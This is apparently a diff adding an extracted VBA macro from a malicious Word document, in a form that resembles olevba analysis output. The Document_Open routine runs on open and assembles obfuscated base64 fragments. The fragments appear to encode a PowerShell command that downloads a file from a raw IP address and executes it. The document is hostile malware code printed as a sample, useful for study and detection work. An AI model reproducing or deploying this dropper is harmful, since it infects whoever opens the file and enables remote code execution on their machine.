@@ -1,0 +1,36 @@
+Filename     : ./macros/b6f2b95cfdbae23441ce10542d9515e8be75ffa9fef90795fe5ca121dfe937b1
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+Sub Document_Open()
+UgpkH = "lDc2dKMXcwTVRBNU55NWxlR1VuT3lSYVQzWjVWVUZZYmtNZ1BTQW5WbUZRWW5OVlpFUTJKenRtYjNKbFlXTm9LQ1J1VmtsNVpGb2dhVzRnSjJoMGRIQTZMeTh4T1RndU1UQXdMakV4T1M0eE1TOWtNUzVxY0djL2NtNWtQVFV6TVRjeExEOXlibVE5TlRNeE56RXNQM0p1WkQwMU16RTNNU3cvY201a1BUVXpNVGN4TEQ5eWJtUT"
+e6ICJa4M = "lOVE14TnpFbkxsTndiR2wwS0Njc0p5a3BlM1J5ZVhza2RGRTViMngzV"
+nw6qWNdI = "XlBOUlDZE5NRXQxY1dvNUp6c2tVM2xOYW5vNExrUnZkMjVzYjJGa1JtbHNaU2drYmxaSmVXUmFMbFJ2VTNSeWFXNW5LQ2tzSUNSS1JHd3laS"
+xjkJgM = "FJ5WmxVcE95UlBNSEJvYjNNZ1BTQW5SRnBVUTBZbk8xTjBZWEowTFZCeWIyTmxjM01nSkVwRWJESmtkSEpt"
+Dim OCAGP
+OCAGP = UgpkH & e6ICJa4M & nw6qWNdI & xjkJgM
+o0GUQtkni = "WTIxa0lDOWpJSE5sZENCaFBYQnZkMlZ5SmlZZ2MyVjBJR0k5YzJobEppWWdjMlYwSUdNOWJHd21KaUJqWVd4c0lDVmhKU1ZpSlNWakpTQWtRbmhFVm5BZ1BTQW5UV3BVUlU5MUp6c2tVM2xOYW5vNElEMGdibVYzTFc5aWFtVmpkQ0JUZVhOMFpXMHVUbV"
+OcxB67Ar = "YwTGxkbFlrTnNhV1Z1ZERza1RHTlNNM0ZpWjJSM0lEMGdKM05OTm05TFFXWW5PeVJHYVZkTmJISlVRaUE5SUNoT1pYY3RUMkpxWldOMElDMURiMjFQWW1wbFkzUWdkMjl5WkM1aGNIQ"
+Dim zIQDNoBx
+zIQDNoBx = o0GUQtkni & OcxB67Ar
+xIz0u = "VlRza1dscEJkbEZJUTNveElEMGdKMmxoVUZwQ1JVTXliaWM3WW5KbFlXczdmV05oZEdOb2V5UnRWV3hrVUVwSk1pQTlJQ2RJVFRaVk1WZ3lKenQ5SkhseGEzUllNRkFnUFN"
+iApqdMc = "BblNtZDJSbGQ0Y0dzbk8zMD0="
+Dim z4aX3pS
+z4aX3pS = xIz0u & iApqdMc
+ehypRoC = "nNhV05oZEdsd"
+kNlLT = "mJpa3VkbVZ5YzJsdmJqc2tRVzVJYldneWFrTmhJRDBnSjJSRGNVSmpNQ2M3SkZONVRXcDZPQzVvWldGa1pYSnpXeWQxYzJWeUxXRm5aVzUwSjEwZ1BTQWtSbWxYVFd4eVZFSTdKRXhyZVUxaElEMGdKMVZTZVVReFZpYzdKRVpwVjAxc2NsUkNMbU5zYjNObEtDazdKRXh2TVZaTFFpQTlJQ2RXUjA1eFQwSlZOU2M3SkVacFYwMXNjbFJDTG5GMWFYUTdKR2cwWXpJNVJtbGxJRDBnSjJkb05VMUtKenN"
+CqE2BJis = "rU2tSc01tUjBjbVpWSUQwZ0pHVnVkanAwWlcxd0"
+Dim ltUlC
+ltUlC = ehypRoC & kNlLT & CqE2BJis
+Dcewo = zIQDNoBx & ltUlC & OCAGP & z4aX3pS
+successfull Dcewo
+End Sub
